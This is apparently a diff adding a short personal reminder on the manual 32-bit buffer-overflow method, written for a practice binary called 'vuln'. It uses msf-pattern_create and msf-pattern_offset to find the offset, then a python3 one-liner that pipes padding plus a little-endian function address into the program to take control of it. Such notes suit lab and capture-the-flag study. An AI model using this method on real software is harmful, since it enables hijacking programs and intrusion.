@@ -1,0 +1,21 @@
+Just a small reminder/note
+------------------
+N = payload number
+N2 = test with 'B' first, then use the function address in little-endian (if the bin is such)
+__________________________
+|32-bit manual buff-method|
+|_________________________|
+|
+|-- 1. check to see if the program is vulnerable, 'msf-pattern_create -l [N]' <- use this to generate a pattern to determine how many bytes are needed
+|   |
+|   |
+|   -"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" <- trying to input max amount can over flow the buffer and overwite important registers
+|   |
+|   |
+|-- 2. check the offset by doing 'msf-pattern_offset -l [N] -q [function-address]'
+|   |
+|   |
+|-- 3. take control of the program <- "python3 -c 'print("A" * [N] + [N2])' | ./vuln"  
+|   |
+|   |
+|-- 4. :)
